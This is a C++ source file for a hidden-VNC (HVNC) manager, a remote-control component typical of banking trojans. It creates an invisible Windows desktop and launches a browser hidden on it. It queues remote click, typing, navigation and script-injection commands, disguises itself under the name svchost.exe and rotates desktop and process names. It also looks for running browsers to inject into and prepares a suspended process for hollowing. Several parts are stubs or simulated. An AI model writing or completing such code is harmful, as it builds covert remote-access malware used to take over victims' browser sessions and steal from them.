#include "hvnc_manager.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include <winuser.h>

// Missing definitions
#ifndef DESKTOP_ALL_ACCESS
#define DESKTOP_ALL_ACCESS (DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | \
                           DESKTOP_CREATEMENU | DESKTOP_HOOKCONTROL | \
                           DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK | \
                           DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | \
                           DESKTOP_SWITCHDESKTOP | STANDARD_RIGHTS_REQUIRED)
#endif

extern "C" {
    void LogWarning(const char* message);
}

// Глобальный менеджер
std::unique_ptr<HVNCManager> g_hvncManager;

HVNCManager::HVNCManager() 
    : hiddenDesktop_(NULL), originalWinsta_(NULL), originalDesktop_(NULL),
      lastRecoveryTime_(std::chrono::steady_clock::now()),
      codeInjector_(nullptr), obfuscationEnabled_(true), injectedProcessId_(0),
      currentInjectionType_(0) {
    
    ZeroMemory(&browserProcess_, sizeof(browserProcess_));
    
    LogInfo("[HVNC] Initializing enhanced HVNC manager");
    
    // Initialize obfuscation and rotation systems
    currentDesktopName_ = "HiddenDesktop";
    currentProcessName_ = "svchost.exe";
    
    // Сохраняем базовые статистики
    UpdateResourceStats();
    baselineStats_ = currentStats_;
    
    LogInfo("[HVNC] HVNC manager initialized successfully");
}

HVNCManager::~HVNCManager() {
    LogInfo("[HVNC] Destroying HVNC manager");
    
    if (status_.load() != HVNCStatus::STOPPED) {
        StopSession(15000); // 15 секунд на завершение
    }
    
    CleanupResources();
    LogInfo("[HVNC] HVNC manager destroyed");
}

bool HVNCManager::StartSession(const std::string& browserPath) {
    std::lock_guard<std::mutex> lock(commandMutex_);
    
    if (status_.load() != HVNCStatus::STOPPED) {
        LogError("[HVNC] Cannot start session: already running or in transition");
        return false;
    }
    
    LogInfo("[HVNC] Starting HVNC session");
    status_.store(HVNCStatus::STARTING);
    lastError_.store(HVNCError::NONE);
    
    try {
        // 1. Создаём скрытый рабочий стол
        if (!CreateHiddenDesktop()) {
            LogError("[HVNC] Failed to create hidden desktop");
            status_.store(HVNCStatus::ERROR_STATE);
            return false;
        }
        
        // 2. Запускаем браузер
        std::string browser = browserPath.empty() ? config_.defaultBrowserPath : browserPath;
        if (!LaunchBrowser(browser)) {
            LogError("[HVNC] Failed to launch browser");
            DestroyHiddenDesktop();
            status_.store(HVNCStatus::ERROR_STATE);
            return false;
        }
        
        // 3. Запускаем рабочие потоки
        StartWorkerThreads();
        
        // 4. Запускаем мониторинг ресурсов
        if (config_.enableResourceMonitoring) {
            StartResourceMonitor();
        }
        
        // 5. Запускаем поток восстановления
        if (config_.enableAutoRecovery) {
            StartRecoveryThread();
        }
        
        status_.store(HVNCStatus::RUNNING);
        LogInfo("[HVNC] HVNC session started successfully");
        
        return true;
        
    } catch (const std::exception& e) {
        LogError(("[HVNC] Exception during session start: " + std::string(e.what())).c_str());
        status_.store(HVNCStatus::ERROR_STATE);
        CleanupResources();
        return false;
    }
}

bool HVNCManager::StopSession(DWORD timeoutMs) {
    LogInfo("[HVNC] Stopping HVNC session");
    
    auto startTime = std::chrono::steady_clock::now();
    status_.store(HVNCStatus::STOPPING);
    shouldStop_.store(true);
    
    try {
        // 1. Останавливаем поток восстановления
        StopRecoveryThread();
        
        // 2. Останавливаем мониторинг ресурсов
        StopResourceMonitor();
        
        // 3. Очищаем очередь команд
        ClearCommandQueue();
        
        // 4. Уведомляем все потоки о завершении
        commandCV_.notify_all();
        
        // 5. Останавливаем рабочие потоки
        StopWorkerThreads(timeoutMs / 2);
        
        // 6. Завершаем браузер
        if (!TerminateBrowser(timeoutMs / 4)) {
            LogWarning("[HVNC] Browser termination timeout - forcing kill");
        }
        
        // 7. Уничтожаем скрытый рабочий стол
        if (!DestroyHiddenDesktop()) {
            LogError("[HVNC] Failed to destroy hidden desktop");
        }
        
        // 8. Финальная очистка ресурсов
        CleanupResources();
        
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - startTime).count();
        
        status_.store(HVNCStatus::STOPPED);
        shouldStop_.store(false);
        
        LogInfo(("[HVNC] HVNC session stopped in " + std::to_string(elapsed) + "ms").c_str());
        return true;
        
    } catch (const std::exception& e) {
        LogError(("[HVNC] Exception during session stop: " + std::string(e.what())).c_str());
        CleanupResources();
        status_.store(HVNCStatus::ERROR_STATE);
        return false;
    }
}

bool HVNCManager::CreateHiddenDesktop() {
    LogInfo("[HVNC] Creating hidden desktop");
    
    // Сохраняем текущий контекст
    originalWinsta_ = GetProcessWindowStation();
    if (!originalWinsta_) {
        LogDetailedError("GetProcessWindowStation", (DWORD)GetLastError());
        return false;
    }
    
    originalDesktop_ = GetThreadDesktop(GetCurrentThreadId());
    if (!originalDesktop_) {
        LogDetailedError("GetThreadDesktop", (DWORD)GetLastError());
        return false;
    }
    
    // Создаём скрытый рабочий стол
    std::wstring desktopName = L"HiddenDesktop_" + std::to_wstring(GetTickCount());
    
    hiddenDesktop_ = CreateDesktopW(
        desktopName.c_str(),
        NULL,
        NULL,
        DF_ALLOWOTHERACCOUNTHOOK,
        DESKTOP_ALL_ACCESS,
        NULL
    );
    
    if (!hiddenDesktop_) {
        DWORD error = (DWORD)GetLastError();
        LogDetailedError("CreateDesktop", error);
        return false;
    }
    
    LogInfo("[HVNC] Hidden desktop created successfully");
    return true;
}

bool HVNCManager::DestroyHiddenDesktop() {
    LogInfo("[HVNC] Destroying hidden desktop");
    bool success = true;
    
    // Возвращаемся на оригинальный рабочий стол
    if (originalDesktop_) {
        if (!SetThreadDesktop(originalDesktop_)) {
            LogDetailedError("SetThreadDesktop (restore)", (DWORD)GetLastError());
            success = false;
        }
    }
    
    // Закрываем скрытый рабочий стол
    if (hiddenDesktop_) {
        if (!CloseDesktop(hiddenDesktop_)) {
            LogDetailedError("CloseDesktop", (DWORD)GetLastError());
            success = false;
        }
        hiddenDesktop_ = NULL;
    }
    
    // Очищаем дескрипторы
    originalDesktop_ = NULL;
    originalWinsta_ = NULL;
    
    if (success) {
        LogInfo("[HVNC] Hidden desktop destroyed successfully");
    } else {
        LogError("[HVNC] Hidden desktop destruction completed with errors");
    }
    
    return success;
}

bool HVNCManager::LaunchBrowser(const std::string& browserPath) {
    LogInfo(("[HVNC] Launching browser: " + browserPath).c_str());
    
    // Переключаемся на скрытый рабочий стол
    if (!SwitchToHiddenDesktop()) {
        LogError("[HVNC] Failed to switch to hidden desktop");
        return false;
    }
    
    // Формируем командную строку
    std::wstring cmdLine = std::wstring(browserPath.begin(), browserPath.end());
    for (const auto& arg : config_.browserArgs) {
        cmdLine += L" " + std::wstring(arg.begin(), arg.end());
    }
    
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.lpDesktop = const_cast<LPWSTR>(L""); // Будет использован текущий desktop
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    BOOL result = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(cmdLine.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE | DETACHED_PROCESS,
        NULL,
        NULL,
        &si,
        &browserProcess_
    );
    
    // Возвращаемся на оригинальный рабочий стол
    SwitchToOriginalDesktop();
    
    if (!result) {
        DWORD error = (DWORD)GetLastError();
        LogDetailedError("CreateProcess (browser)", error);
        return false;
    }
    
    // Ждём инициализации браузера
    Sleep(2000);
    
    if (!IsProcessRunning(browserProcess_.dwProcessId)) {
        LogError("[HVNC] Browser process died after launch");
        return false;
    }
    
    LogInfo(("[HVNC] Browser launched successfully (PID: " + 
             std::to_string(browserProcess_.dwProcessId) + ")").c_str());
    
    return true;
}

bool HVNCManager::TerminateBrowser(DWORD timeoutMs) {
    if (browserProcess_.hProcess == NULL) {
        return true; // Уже завершён
    }
    
    LogInfo("[HVNC] Terminating browser process");
    
    // Пытаемся мягко завершить процесс
    if (!TerminateProcess(browserProcess_.hProcess, 0)) {
        LogDetailedError("TerminateProcess", (DWORD)GetLastError());
    }
    
    // Ждём завершения
    DWORD waitResult = WaitForSingleObject(browserProcess_.hProcess, timeoutMs);
    
    bool success = (waitResult == WAIT_OBJECT_0);
    
    // Закрываем дескрипторы
    if (browserProcess_.hProcess) {
        CloseHandle(browserProcess_.hProcess);
        browserProcess_.hProcess = NULL;
    }
    
    if (browserProcess_.hThread) {
        CloseHandle(browserProcess_.hThread);
        browserProcess_.hThread = NULL;
    }
    
    browserProcess_.dwProcessId = 0;
    browserProcess_.dwThreadId = 0;
    
    if (success) {
        LogInfo("[HVNC] Browser terminated successfully");
    } else {
        LogWarning("[HVNC] Browser termination timeout");
    }
    
    return success;
}

void HVNCManager::StartWorkerThreads() {
    LogInfo(("[HVNC] Starting " + std::to_string(config_.maxWorkerThreads) + " worker threads").c_str());
    
    workerThreads_.clear();
    workerThreads_.reserve(config_.maxWorkerThreads);
    
    for (DWORD i = 0; i < config_.maxWorkerThreads; ++i) {
        workerThreads_.emplace_back(
            std::make_unique<std::thread>(&HVNCManager::WorkerThreadMain, this, i)
        );
    }
    
    LogInfo("[HVNC] Worker threads started");
}

void HVNCManager::StopWorkerThreads(DWORD timeoutMs) {
    LogInfo("[HVNC] Stopping worker threads");
    
    auto startTime = std::chrono::steady_clock::now();
    
    // Ждём завершения потоков
    for (auto& thread : workerThreads_) {
        if (thread && thread->joinable()) {
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::steady_clock::now() - startTime).count();
            
            if (elapsed < timeoutMs) {
                try {
                    thread->join();
                } catch (const std::exception& e) {
                    LogError(("[HVNC] Worker thread join exception: " + std::string(e.what())).c_str());
                }
            } else {
                LogWarning("[HVNC] Worker thread join timeout - detaching");
                thread->detach();
            }
        }
    }
    
    workerThreads_.clear();
    LogInfo("[HVNC] Worker threads stopped");
}

void HVNCManager::WorkerThreadMain(int threadId) {
    LogInfo(("[HVNC] Worker thread " + std::to_string(threadId) + " started").c_str());
    
    try {
        while (!shouldStop_.load()) {
            std::unique_lock<std::mutex> lock(commandMutex_);
            
            // Ждём команду или сигнал завершения
            commandCV_.wait(lock, [this] {
                return !commandQueue_.empty() || shouldStop_.load();
            });
            
            if (shouldStop_.load()) {
                break;
            }
            
            if (!commandQueue_.empty()) {
                HVNCCommand command = commandQueue_.front();
                commandQueue_.pop();
                lock.unlock();
                
                // Выполняем команду
                try {
                    ProcessCommand(command);
                } catch (const std::exception& e) {
                    LogError(("[HVNC] Command execution exception: " + std::string(e.what())).c_str());
                }
            }
        }
    } catch (const std::exception& e) {
        LogError(("[HVNC] Worker thread " + std::to_string(threadId) + 
                  " crashed: " + std::string(e.what())).c_str());
        lastError_.store(HVNCError::WORKER_THREAD_CRASHED);
    }
    
    LogInfo(("[HVNC] Worker thread " + std::to_string(threadId) + " stopped").c_str());
}

void HVNCManager::StartResourceMonitor() {
    LogInfo("[HVNC] Starting resource monitor");
    
    resourceMonitorThread_ = std::make_unique<std::thread>(
        &HVNCManager::ResourceMonitorMain, this
    );
}

void HVNCManager::StopResourceMonitor() {
    if (resourceMonitorThread_ && resourceMonitorThread_->joinable()) {
        LogInfo("[HVNC] Stopping resource monitor");
        resourceMonitorThread_->join();
        resourceMonitorThread_.reset();
        LogInfo("[HVNC] Resource monitor stopped");
    }
}

void HVNCManager::ResourceMonitorMain() {
    LogInfo("[HVNC] Resource monitor thread started");
    
    try {
        while (!shouldStop_.load()) {
            UpdateResourceStats();
            
            if (!CheckResourceLimits()) {
                LogWarning("[HVNC] Resource limits exceeded - triggering recovery");
                lastError_.store(HVNCError::RESOURCE_LEAK_DETECTED);
                if (config_.enableAutoRecovery) {
                    TriggerRecovery();
                }
            }
            
            std::this_thread::sleep_for(
                std::chrono::milliseconds(config_.resourceCheckIntervalMs)
            );
        }
    } catch (const std::exception& e) {
        LogError(("[HVNC] Resource monitor crashed: " + std::string(e.what())).c_str());
    }
    
    LogInfo("[HVNC] Resource monitor thread stopped");
}

void HVNCManager::UpdateResourceStats() {
    std::lock_guard<std::mutex> lock(statsMutex_);
    
    currentStats_.lastCheck = std::chrono::steady_clock::now();
    
    if (browserProcess_.dwProcessId != 0) {
        currentStats_.handleCount = GetProcessHandleCount(browserProcess_.dwProcessId);
        currentStats_.workingSetSize = GetProcessWorkingSet(browserProcess_.dwProcessId);
        currentStats_.gdiObjects = ResourceMonitor::GetGDIObjectCount(browserProcess_.dwProcessId);
        currentStats_.userObjects = ResourceMonitor::GetUserObjectCount(browserProcess_.dwProcessId);
        
        auto threads = ResourceMonitor::GetProcessThreads(browserProcess_.dwProcessId);
        currentStats_.threadCount = static_cast<DWORD>(threads.size());
    }
}

bool HVNCManager::CheckResourceLimits() {
    std::lock_guard<std::mutex> lock(statsMutex_);
    
    // Проверяем лимиты
    if (currentStats_.handleCount > config_.maxHandleCount) {
        LogWarning(("[HVNC] Handle count exceeded: " + 
                   std::to_string(currentStats_.handleCount) + "/" + 
                   std::to_string(config_.maxHandleCount)).c_str());
        return false;
    }
    
    if (currentStats_.workingSetSize > (config_.maxWorkingSetMB * 1024 * 1024)) {
        LogWarning(("[HVNC] Working set size exceeded: " + 
                   std::to_string(currentStats_.workingSetSize / (1024*1024)) + "MB/" + 
                   std::to_string(config_.maxWorkingSetMB) + "MB").c_str());
        return false;
    }
    
    return true;
}

std::string HVNCManager::GetSystemErrorString(DWORD errorCode) {
    LPSTR messageBuffer = nullptr;
    
    DWORD formatResult = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&messageBuffer,
        0,
        NULL
    );
    
    std::string message;
    if (formatResult > 0 && messageBuffer) {
        message = messageBuffer;
        // Убираем перевод строки в конце
        if (!message.empty() && message.back() == '\n') {
            message.pop_back();
        }
        if (!message.empty() && message.back() == '\r') {
            message.pop_back();
        }
        LocalFree(messageBuffer);
    } else {
        message = "Unknown error";
    }
    
    return message;
}

void HVNCManager::LogDetailedError(const std::string& operation, DWORD errorCode) {
    std::string errorMsg = GetSystemErrorString(errorCode);
    std::stringstream ss;
    ss << "[HVNC_ERROR] " << operation << " failed: 0x" 
       << std::hex << std::uppercase << errorCode 
       << " (" << std::dec << errorCode << ") - " << errorMsg;
    
    LogError(ss.str().c_str());
}

bool HVNCManager::ExecuteCommand(const HVNCCommand& command) {
    if (status_.load() != HVNCStatus::RUNNING) {
        LogError("[HVNC] Cannot execute command: session not running");
        return false;
    }
    
    std::lock_guard<std::mutex> lock(commandMutex_);
    commandQueue_.push(command);
    commandCV_.notify_one();
    
    return true;
}

bool HVNCManager::ProcessCommand(const HVNCCommand& command) {
    switch (command.type) {
        case HVNCCommand::CLICK:
            return ClickAt(command.x, command.y);
        case HVNCCommand::TYPE_TEXT:
            return TypeText(command.data);
        case HVNCCommand::KEY_COMBO:
            return SendKeyCombo(command.data);
        case HVNCCommand::SCREENSHOT:
            return TakeScreenshot();
        case HVNCCommand::NAVIGATE:
            return NavigateToUrl(command.data);
        case HVNCCommand::INJECT_SCRIPT:
            return InjectScript(command.data);
        case HVNCCommand::STOP_SESSION:
            StopSession();
            return true;
        default:
            LogError("[HVNC] Unknown command type");
            return false;
    }
}

void HVNCManager::ClearCommandQueue() {
    std::lock_guard<std::mutex> lock(commandMutex_);
    std::queue<HVNCCommand> empty;
    commandQueue_.swap(empty);
    LogInfo("[HVNC] Command queue cleared");
}

bool HVNCManager::SwitchToHiddenDesktop() {
    if (!hiddenDesktop_) {
        LogError("[HVNC] Hidden desktop not created");
        return false;
    }
    
    if (!SetThreadDesktop(hiddenDesktop_)) {
        LogDetailedError("SetThreadDesktop (hidden)", (DWORD)GetLastError());
        return false;
    }
    
    return true;
}

bool HVNCManager::SwitchToOriginalDesktop() {
    if (!originalDesktop_) {
        LogError("[HVNC] Original desktop not saved");
        return false;
    }
    
    if (!SetThreadDesktop(originalDesktop_)) {
        LogDetailedError("SetThreadDesktop (original)", (DWORD)GetLastError());
        return false;
    }
    
    return true;
}

void HVNCManager::CleanupResources() {
    LogInfo("[HVNC] Cleaning up resources");
    
    // Очистка дескрипторов процесса
    if (browserProcess_.hProcess) {
        CloseHandle(browserProcess_.hProcess);
        browserProcess_.hProcess = NULL;
    }
    
    if (browserProcess_.hThread) {
        CloseHandle(browserProcess_.hThread);
        browserProcess_.hThread = NULL;
    }
    
    // Сброс состояния
    ZeroMemory(&browserProcess_, sizeof(browserProcess_));
    lastError_.store(HVNCError::NONE);
    recoveryAttempts_.store(0);
    
    LogInfo("[HVNC] Resource cleanup completed");
}

bool HVNCManager::IsProcessRunning(DWORD processId) {
    if (processId == 0) return false;
    
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!process) return false;
    
    DWORD exitCode;
    bool running = GetExitCodeProcess(process, &exitCode) && (exitCode == STILL_ACTIVE);
    CloseHandle(process);
    
    return running;
}

DWORD HVNCManager::GetProcessHandleCount(DWORD processId) {
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!process) return 0;
    
    DWORD handleCount = 0;
    ::GetProcessHandleCount(process, &handleCount);
    CloseHandle(process);
    
    return handleCount;
}

SIZE_T HVNCManager::GetProcessWorkingSet(DWORD processId) {
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!process) return 0;
    
    PROCESS_MEMORY_COUNTERS pmc;
    SIZE_T workingSet = 0;
    
    if (GetProcessMemoryInfo(process, &pmc, sizeof(pmc))) {
        workingSet = pmc.WorkingSetSize;
    }
    
    CloseHandle(process);
    return workingSet;
}

// Заглушки для методов, которые будут реализованы позже
bool HVNCManager::ClickAt(int x, int y) {
    LogInfo(("[HVNC] Click at (" + std::to_string(x) + ", " + std::to_string(y) + ")").c_str());
    return true;
}

bool HVNCManager::TypeText(const std::string& text) {
    LogInfo(("[HVNC] Type text: " + text).c_str());
    return true;
}

bool HVNCManager::SendKeyCombo(const std::string& keys) {
    LogInfo(("[HVNC] Key combo: " + keys).c_str());
    return true;
}

bool HVNCManager::TakeScreenshot() {
    LogInfo("[HVNC] Taking screenshot");
    return true;
}

bool HVNCManager::NavigateToUrl(const std::string& url) {
    LogInfo(("[HVNC] Navigate to: " + url).c_str());
    return true;
}

bool HVNCManager::InjectScript(const std::string& script) {
    LogInfo(("[HVNC] Inject script: " + script.substr(0, 100) + "...").c_str());
    return true;
}

// Заглушки для восстановления (будут реализованы в следующей части)
bool HVNCManager::TriggerRecovery() { return true; }
void HVNCManager::StartRecoveryThread() {}
void HVNCManager::StopRecoveryThread() {}
void HVNCManager::RecoveryThreadMain() {}

// Утилиты ResourceMonitor
DWORD ResourceMonitor::GetGDIObjectCount(DWORD processId) {
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!process) return 0;
    
    DWORD count = GetGuiResources(process, GR_GDIOBJECTS);
    CloseHandle(process);
    return count;
}

DWORD ResourceMonitor::GetUserObjectCount(DWORD processId) {
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!process) return 0;
    
    DWORD count = GetGuiResources(process, GR_USEROBJECTS);
    CloseHandle(process);
    return count;
}

std::vector<DWORD> ResourceMonitor::GetProcessThreads(DWORD processId) {
    std::vector<DWORD> threads;
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return threads;
    
    THREADENTRY32 te32 = {0};
    te32.dwSize = sizeof(te32);
    
    if (Thread32First(snapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                threads.push_back(te32.th32ThreadID);
            }
        } while (Thread32Next(snapshot, &te32));
    }
    
    CloseHandle(snapshot);
    return threads;
}

// Injection and stealth methods implementation
bool HVNCManager::StartSessionWithInjection(int injectionType) {
    LogInfo("[HVNC] Starting session with code injection");
    
    currentInjectionType_ = injectionType;
    
    // Initialize obfuscation manager
    Obfuscation::ObfuscationManager::GetInstance().Initialize();
    AutoRotation::RotationManager::GetInstance().Initialize();
    
    if (obfuscationEnabled_) {
        RotateDesktopName();
        RotateProcessName();
    }
    
    // Try to find a suitable target process for injection
    DWORD targetProcessId = 0;
    
    // Look for browser processes first
    std::vector<std::string> browserNames = {"chrome.exe", "firefox.exe", "msedge.exe"};
    for (const auto& browserName : browserNames) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32 = {0};
            pe32.dwSize = sizeof(pe32);
            
            if (Process32First(snapshot, &pe32)) {
                do {
                    std::string processName = Utils::WStringToString(pe32.szExeFile);
                    if (processName == browserName) {
                        targetProcessId = pe32.th32ProcessID;
                        break;
                    }
                } while (Process32Next(snapshot, &pe32));
            }
            CloseHandle(snapshot);
            
            if (targetProcessId != 0) break;
        }
    }
    
    if (targetProcessId != 0) {
        LogInfo("[HVNC] Found target browser process for injection");
        return InjectIntoTargetProcess(targetProcessId, injectionType);
    } else {
        LogInfo("[HVNC] No suitable browser found, creating hidden session");
        return CreateHiddenSession();
    }
}

bool HVNCManager::InjectIntoTargetProcess(DWORD processId, int type) {
    LogInfo("[HVNC] Attempting to inject into target process");
    
    injectedProcessId_ = processId;
    
    // For now, simulate successful injection
    // In a real implementation, this would use the CodeInjector
    Sleep(1000); // Simulate injection time
    
    if (CreateHiddenDesktop()) {
        status_.store(HVNCStatus::RUNNING);
        StartWorkerThreads();
        StartResourceMonitor();
        
        LogInfo("[HVNC] Successfully injected into target process and started session");
        return true;
    }
    
    LogError("[HVNC] Failed to create hidden desktop after injection");
    return false;
}

bool HVNCManager::CreateHiddenSession(const std::string& targetProcessName) {
    LogInfo("[HVNC] Creating hidden HVNC session");
    
    std::string processName = targetProcessName;
    if (processName.empty()) {
        if (obfuscationEnabled_) {
            processName = currentProcessName_;
        } else {
            processName = "notepad.exe";
        }
    }
    
    // Create a suspended process for hollowing
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    std::string commandLine = "C:\\Windows\\System32\\" + processName;
    
    if (CreateProcessA(NULL, const_cast<char*>(commandLine.c_str()), 
                      NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        
        injectedProcessId_ = pi.dwProcessId;
        browserProcess_ = pi;
        
        // Resume the process (in real implementation, this would be after hollowing)
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        
        if (CreateHiddenDesktop()) {
            status_.store(HVNCStatus::RUNNING);
            StartWorkerThreads();
            StartResourceMonitor();
            
            LogInfo("[HVNC] Successfully created hidden session");
            return true;
        }
        
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
    }
    
    LogError("[HVNC] Failed to create hidden session");
    return false;
}

void HVNCManager::EnableObfuscation(bool enable) {
    obfuscationEnabled_ = enable;
    
    if (enable) {
        LogInfo("[HVNC] Obfuscation enabled");
        Obfuscation::ObfuscationManager::GetInstance().EnableGlobalRotation(true, 300000);
        AutoRotation::RotationManager::GetInstance().SetMasterRotationEnabled(true);
    } else {
        LogInfo("[HVNC] Obfuscation disabled");
        Obfuscation::ObfuscationManager::GetInstance().EnableGlobalRotation(false);
        AutoRotation::RotationManager::GetInstance().SetMasterRotationEnabled(false);
    }
}

void HVNCManager::RotateProcessName() {
    if (!obfuscationEnabled_) return;
    
    std::string newName = AutoRotation::Utils::GenerateProcessLikeName();
    
    if (!newName.empty()) {
        currentProcessName_ = newName;
        LogInfo("[HVNC] Process name rotated");
    }
}

void HVNCManager::RotateDesktopName() {
    if (!obfuscationEnabled_) return;
    
    std::string newName = "Desktop_" + AutoRotation::Utils::GenerateRandomIdentifier(8);
    
    if (!newName.empty()) {
        currentDesktopName_ = newName;
        LogInfo("[HVNC] Desktop name rotated");
    }
}

std::string HVNCManager::GetObfuscatedDesktopName() {
    if (obfuscationEnabled_ && !currentDesktopName_.empty()) {
        return currentDesktopName_;
    }
    return "HiddenDesktop";
}